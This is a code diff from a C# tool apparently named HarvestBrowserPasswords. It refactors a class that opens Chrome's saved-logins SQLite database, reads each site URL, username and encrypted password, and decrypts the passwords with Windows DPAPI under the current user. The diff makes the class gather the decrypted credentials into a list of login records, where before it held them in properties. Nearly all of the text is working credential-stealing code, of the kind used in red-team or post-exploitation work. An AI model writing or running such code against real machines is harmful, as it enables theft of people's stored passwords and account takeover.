@@ -9,12 +9,10 @@ namespace HarvestBrowserPasswords
 {
     public class ChromeDatabaseDecryptor
     {
-        public string FilePath { get; set; }
-        public string FormSubmitUrl { get; set; }
-        public string Username { get; set; }
-        public string Password { get; set; }
+        private string FilePath { get; set; }
+        public List<BrowserLoginData> ChromeLoginDataList { get; set; }
 
-        public  ChromeDatabaseDecryptor(string databaseFilePath)
+        public ChromeDatabaseDecryptor(string databaseFilePath)
         {
             FilePath = databaseFilePath;
             SQLiteConnection sqliteConnection = new SQLiteConnection(
@@ -22,9 +20,10 @@ namespace HarvestBrowserPasswords
                 $"Version=3;" +
                 $"New=True");
 
+            ChromeLoginDataList = new List<BrowserLoginData>();
+
             try
             {
-
                 sqliteConnection.Open();
                 SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
                 sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
@@ -34,39 +33,40 @@ namespace HarvestBrowserPasswords
                 while (sqliteDataReader.Read())
                 {
                     //Store columns as variables
-                    FormSubmitUrl = sqliteDataReader.GetString(0);
+                    string formSubmitUrl = sqliteDataReader.GetString(0);
+
                     //Avoid Printing empty rows
-                    if (FormSubmitUrl == "")
+                    if (String.IsNullOrEmpty(formSubmitUrl))
                     {
                         continue;
                     }
 
-                    Username = sqliteDataReader.GetString(1);
+                    string username = sqliteDataReader.GetString(1);
                     byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption
 
                     try
                     {
                         //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                         byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
-                        Password = Encoding.ASCII.GetString(decryptedBytes);
-                        Console.WriteLine($"[+] Decrypted Google Chrome Credentials for {FormSubmitUrl}!");
-                        /*
-                        Console.WriteLine($"\tURL:      {FormSubmitUrl}");
-                        Console.WriteLine($"\tUsername: {Username}");
-                        Console.WriteLine($"\tPassword: {Password}");
-                        */
-                        
+                        string decryptedPasswordString = Encoding.ASCII.GetString(decryptedBytes);
+
+                        BrowserLoginData loginData = new BrowserLoginData(formSubmitUrl, username, decryptedPasswordString, "Chrome");
+                        ChromeLoginDataList.Add(loginData);
                     }
                     catch (Exception e)
                     {
+                        Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine($"[!] Error Decrypting Password: Exception {e}");
+                        Console.ResetColor();
                     }
                 }
     
             }
             catch (Exception e)
             {
+                Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine($"[!] Error connecting to database: {FilePath}\nException: {e}");
+                Console.ResetColor();
             }
 
             sqliteConnection.Close();
